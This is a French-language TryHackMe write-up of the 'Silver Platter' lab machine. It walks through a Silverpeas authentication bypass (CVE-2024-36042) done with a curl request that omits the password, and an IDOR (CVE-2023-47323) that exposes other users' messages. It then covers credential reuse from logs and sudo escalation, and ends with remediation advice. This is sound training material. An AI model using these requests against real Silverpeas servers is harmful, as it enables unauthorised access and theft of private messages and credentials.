# 🥈 Silver Platter — TryHackMe Writeup

> **Plateforme :** TryHackMe
> **Difficulté :** Easy
> **Cible :** `10.80.160.37`
> **OS :** Ubuntu (Linux 5.15.0-91-generic)
> **Auteur :** Kryptonite

---

## 📖 Contexte

Silver Platter est une machine CTF de niveau facile proposée par TryHackMe. L'objectif est de compromettre un serveur web hébergeant une instance de **Silverpeas** (plateforme collaborative Java), puis d'élever ses privilèges jusqu'à `root`. Le scénario met en scène l'équipe fictive *Hack Smarter Security*, qui prétend avoir fortifié son serveur contre les attaques courantes.

Deux vulnérabilités critiques de Silverpeas sont exploitées :

- **CVE-2024-36042** — Contournement d'authentification via suppression du paramètre `Password`
- **CVE-2023-47323** — IDOR permettant la lecture de messages arbitraires

L'escalade de privilèges se fait ensuite en deux temps : passage de `tim` à `tyler` via des identifiants en clair dans les logs système, puis `tyler` à `root` grâce à une mauvaise configuration `sudo`.

---

## 1. 🔍 Reconnaissance

### 1.1 Scan de ports

```bash
nmap -sC -sV -p- 10.80.160.37
```

| Port | État | Service |
|------|------|---------|
| 22 | open | SSH (OpenSSH 8.9p1 Ubuntu) |
| 80 | open | HTTP (nginx 1.18.0) |
| 8080 | open | HTTP — Silverpeas |

### 1.2 Énumération web (port 80)

Le serveur web principal expose une page statique basée sur le template **Dimension** (HTML5 UP). Les fichiers `readme.txt` et `LICENSE.txt` sont accessibles mais ne fournissent aucune information sensible — ce sont les fichiers d'origine du template.

Cependant, **le code source de la page d'accueil** contient un indice capital :

> *"If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is `scr1ptkiddy`."*

Ce nom d'utilisateur sera utilisé pour l'exploit d'authentification.

### 1.3 Énumération du port 8080

`ffuf` révèle plusieurs endpoints intéressants, tous redirigés vers `noredirect.html` :

```
/console/                       → /noredirect.html
/console/j_security_check       → /noredirect.html
/console/login/LoginForm.jsp    → /noredirect.html
/console/base/config.json       → /noredirect.html
/console/payments/config.json   → /noredirect.html
/website                        → /website/
```

Ces chemins correspondent à une **console d'administration d'application Java** (type WebLogic / Jenkins) mais sont inaccessibles directement. C'est le chemin `/silverpeas` qui nous intéresse.

### 1.4 Détection de la stack

Nuclei confirme la présence de **Silverpeas** sur `/silverpeas/`, accessible via `http://10.80.160.37:8080/silverpeas/`.

---

## 2. 💥 Exploitation — CVE-2024-36042

### 2.1 La vulnérabilité

Silverpeas souffre d'un défaut logique dans le traitement des requêtes d'authentification : si le paramètre `Password` est **complètement absent** (et non vide) du corps de la requête `POST` vers `AuthenticationServlet`, le serveur valide l'authentification **sans vérifier aucun mot de passe**.

- **Endpoint vulnérable :** `/silverpeas/AuthenticationServlet`
- **Méthode :** `POST`
- **Corps minimal requis :** `Login=<username>&DomainId=0`

### 2.2 Exploit

```bash
curl -i "http://10.80.160.37:8080/silverpeas/AuthenticationServlet" \
     -d "Login=scr1ptkiddy&DomainId=0" \
     -H "Content-Type: application/x-www-form-urlencoded"
```

### 2.3 Réponse du serveur

```
HTTP/1.1 302 Found
Set-Cookie: JSESSIONID=IRKSe1A12p78sp0TmA-CmfgUU2VEimvDz-_uY78Y.ebabc79c6d2a; path=/silverpeas; HttpOnly
Set-Cookie: defaultDomain=0; path=/;
Set-Cookie: svpLogin=scr1ptkiddy; path=/;
Location: http://10.80.160.37:8080/silverpeas/Main//look/jsp/MainFrame.jsp
```

✅ **Authentification réussie** — un `JSESSIONID` valide a été émis pour le compte `scr1ptkiddy`.

### 2.4 Session valide dans le navigateur

Après injection des cookies dans le navigateur (via DevTools → Application → Cookies, ou l'extension **Cookie-Editor**), la requête :

```
GET /silverpeas/look/jsp/MainFrame.jsp HTTP/1.1
Cookie: JSESSIONID=kfOkxsvBFRpQ4Nu6weg-rHCofpCiinQd6dmmNPSX...; svpLogin=scr1ptkiddy; defaultDomain=0
```

renvoie un `200 OK`. L'interface Silverpeas est accessible.

> ⚠️ **Note** : dans Burp Repeater, il faut activer l'option **"Follow redirections"** pour que la session soit pleinement établie.

---

## 3. 🎯 CVE-2023-47323 — IDOR sur les messages

### 3.1 Le contexte

Silverpeas utilise des identifiants numériques séquentiels pour les messages. Aucun contrôle d'accès n'empêche un utilisateur authentifié de lire **les messages d'autres utilisateurs** en manipulant simplement le paramètre `NotifId` / `ID` dans l'URL de lecture.

- **Endpoint vulnérable :** `/silverpeas/RSILVERMAIL/jsp/ReadSentNotification.jsp?NotifId=<n>`

### 3.2 Exploit

En énumérant `NotifId` (via navigateur, `curl` ou Burp Intruder), le message **NotifId=7** contient des identifiants SSH en clair :

```
Dude how do you always forget the SSH password? Use a password manager and
quit using your silly sticky notes.

Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

### 3.3 Accès SSH — Flag utilisateur

```bash
ssh tim@10.80.160.37
```

```bash
tim@ip-10-80-160-37:~$ ls
user.txt
tim@ip-10-80-160-37:~$ cat user.txt
THM{<user_flag>}
```

✅ **Flag utilisateur récupéré.**

---

## 4. 🔼 Escalade de privilèges — `tim` → `tyler`

### 4.1 Énumération système

```bash
tim@ip-10-80-160-37:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

L'utilisateur `tim` appartient au groupe **`adm`**, ce qui lui donne accès à la lecture des logs système dans `/var/log/`. C'est un point d'entrée souvent sous-estimé lors de l'escalade de privilèges.

```bash
tim@ip-10-80-160-37:~$ ls /home
ssm-user  tim  tyler  ubuntu
```

Trois autres utilisateurs existent : `tyler`, `ubuntu`, `ssm-user`.

### 4.2 Analyse des logs

En parcourant les logs avec `grep`, une entrée `sudo` dans `/var/log/auth.log` (ou `syslog`) révèle un mot de passe en clair :

```
Dec 13 15:45:21 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ;
COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d \
  -e DB_NAME=Silverpeas \
  -e DB_USER=silverpeas \
  -e DB_PASSWORD=_Zd_zx7N823/ \
  -v silverpeas-log:/opt/silverpeas/log \
  -v silverpeas-data:/opt/silvepeas/data \
  --link postgresql:database \
  silverpeas:silverpeas-6.3.1
```

Le mot de passe `_Zd_zx7N823/` est celui de l'utilisateur **`tyler`** (probablement réutilisé).

### 4.3 Pivot vers `tyler`

```bash
tim@ip-10-80-160-37:~$ su tyler
Password: _Zd_zx7N823/
tyler@ip-10-80-160-37:~$ whoami
tyler
```

✅ **Pivot réussi vers `tyler`.**

---

## 5. 🔼 Escalade de privilèges — `tyler` → `root`

### 5.1 Énumération `sudo`

```bash
tyler@ip-10-80-160-37:~$ sudo -l
[sudo] password for tyler:
Matching Defaults entries for tyler on ip-10-80-160-37:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User tyler may run the following commands on ip-10-80-160-37:
    (ALL : ALL) ALL
```

`tyler` peut exécuter **n'importe quelle commande en tant que root**, sans restriction. C'est une configuration `sudo` triviale.

### 5.2 Root

```bash
tyler@ip-10-80-160-37:~$ sudo su
root@ip-10-80-160-37:/home/tyler# cat /root/root.txt
THM{<root_flag>}
```

✅ **Flag root récupéré — machine compromise.**

---

## 6. 🗺️ Résumé du parcours d'attaque

```
[Recon]    Port 80 → indice "scr1ptkiddy"
              ↓
[CVE-2024-36042]  Bypass auth Silverpeas (Login sans Password)
              ↓
[Session]  Cookie JSESSIONID pour scr1ptkiddy
              ↓
[CVE-2023-47323]  IDOR sur ReadSentNotification.jsp?NotifId=7
              ↓
[Credentials]  SSH tim : cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
              ↓
[Flag user]  /home/tim/user.txt
              ↓
[Lateral]  Logs sudo → mot de passe tyler (_Zd_zx7N823/)
              ↓
[Escalade]  sudo -l → (ALL : ALL) ALL
              ↓
[Flag root]  /root/root.txt
```

---

## 7. 🛡️ Recommandations de remédiation

| Vulnérabilité | Recommandation |
|---|---|
| **CVE-2024-36042** (bypass auth) | Mettre à jour Silverpeas ; valider systématiquement la présence et la validité du mot de passe côté serveur |
| **CVE-2023-47323** (IDOR) | Contrôler l'appartenance des ressources avant lecture ; utiliser des UUID non devinables |
| **Identifiants SSH en clair** | Ne jamais écrire de mots de passe dans les messages applicatifs ; utiliser un gestionnaire de secrets (Vault, SOPS) |
| **Mot de passe réutilisé** | Politique de rotation et unicité par service ; MFA sur SSH |
| **Mot de passe en clair dans les logs** | Filtrer les logs pour ne jamais afficher les secrets ; audit régulier avec `grep -i password /var/log/*` |
| **`sudo ALL` sans restriction** | Appliquer le principe du moindre privilège (`NOPASSWD` ciblé, commandes précises) |
| **Accès aux logs via groupe `adm`** | Réserver `adm` aux administrateurs ; segmenter les permissions |

---

## 8. 📚 Références

- [CVE-2024-36042 — Silverpeas Auth Bypass](https://nvd.nist.gov/vuln/detail/CVE-2024-36042)
- [CVE-2023-47323 — Silverpeas IDOR](https://nvd.nist.gov/vuln/detail/CVE-2023-47323)
- [Silverpeas Documentation](https://www.silverpeas.org/)
- [TryHackMe — Silver Platter](https://tryhackme.com/room/silverplatter)
- [GTFOBins — Escalade sudo](https://gtfobins.github.io/)

---

*Writeup réalisé dans un cadre légal — machine CTF TryHackMe. Aucune cible réelle n'a été compromise.*
